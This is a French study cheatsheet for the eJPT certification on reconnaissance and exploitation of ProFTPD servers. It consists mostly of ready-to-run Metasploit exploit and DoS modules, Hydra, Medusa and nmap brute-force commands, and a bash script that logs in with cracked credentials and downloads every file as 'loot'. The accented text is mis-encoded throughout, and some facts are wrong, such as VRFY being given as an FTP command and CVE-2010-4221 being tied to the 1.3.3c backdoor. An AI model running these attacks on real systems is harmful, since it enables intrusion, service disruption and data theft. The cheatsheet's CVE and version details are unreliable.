# ProFTPD Recon & Exploitation - Cheatsheet eJPT

## Vue d'ensemble
Cette cheatsheet couvre les techniques de reconnaissance et d'exploitation des serveurs ProFTPD, incluant l'√©num√©ration, les attaques par force brute, l'exploitation de vuln√©rabilit√©s via Metasploit et les techniques de post-exploitation.

---

## Phase 1: Reconnaissance et d√©tection

### Test de connectivit√©
```bash
# V√©rification de l'accessibilit√©
ping -c 4 <target>

# Test de connectivit√© FTP
telnet <target> 21
nc -nv <target> 21
```

### Scan des ports FTP
```bash
# Scan basique du port FTP
nmap -p 21 <target>

# Scan avec d√©tection de version
nmap -sV -p 21 <target>

# Scan complet des ports FTP alternatifs
nmap -p 21,2121,990,989 -sV <target>

# Scan agressif avec scripts
nmap -sS -sV -sC -p 21 --script ftp* <target>
```

### Banner Grabbing
```bash
# Avec netcat
nc -nv <target> 21

# Avec telnet
telnet <target> 21

# Avec nmap
nmap -sV -p 21 <target> --version-intensity 9

# Identification sp√©cifique ProFTPD
nmap -p 21 --script banner <target>
```

---

## Phase 2: √ânum√©ration ProFTPD

### Scripts Nmap sp√©cialis√©s
```bash
# Enum√©ration compl√®te FTP
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 <target>

# Test d'acc√®s anonyme
nmap --script ftp-anon -p 21 <target>

# D√©tection de versions vuln√©rables
nmap --script ftp-proftpd-backdoor -p 21 <target>

# Test de bounce attack
nmap --script ftp-bounce -p 21 <target>
```

### Test d'acc√®s anonyme
```bash
# Connexion manuelle
ftp <target>
# User: anonymous
# Password: anonymous@domain.com

# Test automatique
echo "anonymous" | ftp <target>
```

### √ânum√©ration des utilisateurs
```bash
# Via VRFY (si activ√©)
telnet <target> 21
VRFY root
VRFY admin
VRFY test

# Avec Metasploit
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
run
```

---

## üéØ Phase 3: Exploitation Metasploit - Modules ProFTPD

### üìã Modules d'exploitation critiques

#### üî• exploit/unix/ftp/proftpd_133c_backdoor
```bash
# ProFTPD 1.3.3c Backdoor (CVE-2010-4221)
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS <target>
set RPORT 21
check                    # V√©rifier la vuln√©rabilit√©
exploit
```

**D√©tails :**
- **Vuln√©rabilit√©** : Backdoor dans ProFTPD 1.3.3c
- **Impact** : RCE avec privil√®ges du service FTP
- **Conditions** : Version sp√©cifique 1.3.3c compromise

#### üî• exploit/linux/ftp/proftp_sreplace
```bash
# ProFTPD sreplace Buffer Overflow
use exploit/linux/ftp/proftp_sreplace
set RHOSTS <target>
set RPORT 21
show targets             # Voir les cibles disponibles
set TARGET <target_id>
exploit
```

**D√©tails :**
- **Vuln√©rabilit√©** : Buffer overflow dans la fonction sreplace
- **Impact** : RCE avec privil√®ges utilisateur
- **Versions affect√©es** : ProFTPD < 1.3.0

#### üî• exploit/linux/ftp/proftp_telnet_iac
```bash
# ProFTPD Telnet IAC Buffer Overflow
use exploit/linux/ftp/proftp_telnet_iac
set RHOSTS <target>
set RPORT 21
show options
exploit
```

**D√©tails :**
- **Vuln√©rabilit√©** : Buffer overflow via commandes Telnet IAC
- **Impact** : RCE complet
- **Versions affect√©es** : ProFTPD 1.2.x

### üìä Modules auxiliaires sp√©cialis√©s

#### üîç auxiliary/scanner/ftp/ftp_version
```bash
# D√©tection de version d√©taill√©e
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
set RPORT 21
run
```

#### üîç auxiliary/scanner/ftp/anonymous
```bash
# Test d'acc√®s anonyme automatis√©
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target>
set RPORT 21
run
```

#### üí• auxiliary/dos/ftp/proftpd_cpu_consumption
```bash
# DoS par consommation CPU
use auxiliary/dos/ftp/proftpd_cpu_consumption
set RHOSTS <target>
set RPORT 21
run
```

### üéõÔ∏è Workflow Metasploit pour ProFTPD

#### 1. Reconnaissance initiale
```bash
msfconsole -q
db_status                # V√©rifier la DB

# Scanner de version
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
run

# Test anonyme
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target>
run
```

#### 2. Identification des vuln√©rabilit√©s
```bash
# Recherche d'exploits ProFTPD
search type:exploit name:proftpd

# Informations sur un exploit sp√©cifique
info exploit/unix/ftp/proftpd_133c_backdoor

# V√©rification de vuln√©rabilit√©
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS <target>
check
```

#### 3. Exploitation cibl√©e
```bash
# Selon la version d√©tect√©e
# Pour ProFTPD 1.3.3c
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS <target>
set LHOST <attacker_ip>
set LPORT 4444
exploit

# Pour versions plus anciennes
use exploit/linux/ftp/proftp_sreplace
set RHOSTS <target>
show targets
set TARGET 0
exploit
```

### üìã Table des exploits ProFTPD par version

| Version ProFTPD | Exploit Metasploit | CVE | Criticit√© |
|-----------------|-------------------|-----|-----------|
| **1.3.3c** | `exploit/unix/ftp/proftpd_133c_backdoor` | CVE-2010-4221 | üî¥ Critique |
| **< 1.3.0** | `exploit/linux/ftp/proftp_sreplace` | CVE-2006-5815 | üü† √âlev√©e |
| **1.2.x** | `exploit/linux/ftp/proftp_telnet_iac` | CVE-2001-0550 | üü† √âlev√©e |
| **1.3.0** | `auxiliary/dos/ftp/proftpd_cpu_consumption` | - | üü° DoS |

---

## Phase 4: Attaques par force brute

### Avec Hydra (Recommand√©)

#### Configuration de base
```bash
# Utilisateur unique, wordlist de mots de passe
hydra -l <username> -P <password_file> ftp://<target>

# Wordlist d'utilisateurs, mot de passe unique
hydra -L <user_file> -p <password> ftp://<target>

# Wordlists multiples (comme dans le lab)
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> -t 4 ftp
```

#### Options avanc√©es Hydra
```bash
# Avec limitation de threads et timeout
hydra -L users.txt -P passwords.txt ftp://<target> -t 4 -w 30

# Mode verbose
hydra -L users.txt -P passwords.txt ftp://<target> -V -f

# Avec port personnalis√©
hydra -L users.txt -P passwords.txt ftp://<target>:2121 -t 4

# Arr√™t √† la premi√®re r√©ussite
hydra -L users.txt -P passwords.txt ftp://<target> -f -t 10
```

### Avec Nmap Scripts

#### Force brute cibl√©e
```bash
# Utilisateur sp√©cifique (comme sysadmin dans le lab)
echo "sysadmin" > users.txt
nmap --script ftp-brute --script-args userdb=users.txt -p 21 <target>

# Avec wordlists personnalis√©es
nmap --script ftp-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt -p 21 <target>

# Force brute basique avec listes par d√©faut
nmap --script ftp-brute -p 21 <target>
```

### üéØ Avec Metasploit (Int√©gr√© au workflow)
```bash
msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS false  # Pour trouver tous les comptes
set VERBOSE true
set BRUTEFORCE_SPEED 5     # Vitesse d'attaque
run

# Voir les credentials trouv√©s
creds
```

### Avec Medusa
```bash
# Syntaxe de base
medusa -h <target> -u <username> -P <password_file> -M ftp

# Attaque compl√®te
medusa -h <target> -U /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -M ftp -t 10
```

---

## Phase 5: Exploitation post-authentification

### Connexion FTP manuelle
```bash
# Connexion basique
ftp <target>
# Entrer username/password

# Connexion avec port personnalis√©
ftp <target> 2121

# Mode passif (pour contourner les firewalls)
ftp <target>
passive
```

### Commandes FTP essentielles
```bash
# Navigation
pwd                    # R√©pertoire courant
ls                     # Lister les fichiers
ls -la                 # Liste d√©taill√©e avec fichiers cach√©s
cd <directory>         # Changer de r√©pertoire
cd ..                  # R√©pertoire parent

# Transfert de fichiers
get <filename>         # T√©l√©charger un fichier
mget *.txt            # T√©l√©charger plusieurs fichiers
put <filename>        # Uploader un fichier
mput *.txt            # Uploader plusieurs fichiers

# Gestion des modes
binary                # Mode binaire
ascii                 # Mode texte
passive              # Mode passif
active               # Mode actif

# Informations
stat                  # Statut du serveur
syst                  # Type de syst√®me
help                  # Aide
```

### Recherche syst√©matique de flags/donn√©es

#### Script de collecte automatique
```bash
#!/bin/bash
# ftp_collector.sh

TARGET=$1
CREDS_FILE=$2

while IFS=':' read -r username password; do
    echo "Testing $username:$password"
    
    # Connexion FTP automatique
    ftp -n $TARGET << EOF
user $username $password
passive
binary
prompt off
ls -la
mget *
quit
EOF

    # Organiser les fichiers par utilisateur
    mkdir -p "loot/$username"
    mv * "loot/$username/" 2>/dev/null
    
done < "$CREDS_FILE"
```

---

## üéØ Phase 6: Workflow complet eJPT

### 1. Reconnaissance rapide
```bash
# Scan initial
nmap -sV -p 21 <target>

# Banner grabbing
nc -nv <target> 21
```

### 2. Identification ProFTPD et version
```bash
# Metasploit pour version pr√©cise
msfconsole -q
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
run

# Test anonyme automatique
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target>
run
```

### 3. Exploitation selon la version
```bash
# Pour ProFTPD 1.3.3c (Backdoor)
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS <target>
check
exploit

# Si pas de backdoor, force brute
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

### 4. Post-exploitation
```bash
# Si shell obtenu via exploit
whoami
ls -la
cat /etc/passwd

# Si credentials obtenus
ftp <target>
# login avec creds trouv√©s
ls -la
get *
```

---

## ‚ö†Ô∏è Points d'attention eJPT

### Ordre de priorit√© d'attaque
1. **Test anonyme** - Toujours en premier
2. **D√©tection de backdoor** - ProFTPD 1.3.3c sp√©cifiquement
3. **Exploitation directe** - Via exploits Metasploit
4. **Force brute** - Si pas d'exploit disponible
5. **√ânum√©ration manuelle** - Recherche de fichiers sensibles

### Modules Metasploit prioritaires
| Priorit√© | Module | Usage |
|----------|---------|--------|
| **1** | `auxiliary/scanner/ftp/ftp_version` | Identification version |
| **2** | `exploit/unix/ftp/proftpd_133c_backdoor` | Si version 1.3.3c |
| **3** | `auxiliary/scanner/ftp/ftp_login` | Force brute int√©gr√© |
| **4** | `auxiliary/scanner/ftp/anonymous` | Test acc√®s anonyme |

### Erreurs √† √©viter
- Ignorer la d√©tection de version pr√©cise
- Ne pas tester l'acc√®s anonyme en premier
- Utiliser des outils externes quand Metasploit a les modules
- Oublier de v√©rifier la backdoor 1.3.3c
- Ne pas organiser les donn√©es collect√©es

### Commandes essentielles
```bash
# Reconnaissance compl√®te
nmap -sV -sC -p 21 --script ftp* <target>

# Metasploit workflow
use auxiliary/scanner/ftp/ftp_version
use exploit/unix/ftp/proftpd_133c_backdoor
use auxiliary/scanner/ftp/ftp_login

# Force brute externe (si n√©cessaire)
hydra -L users.txt -P passwords.txt ftp://<target> -t 4 -f
```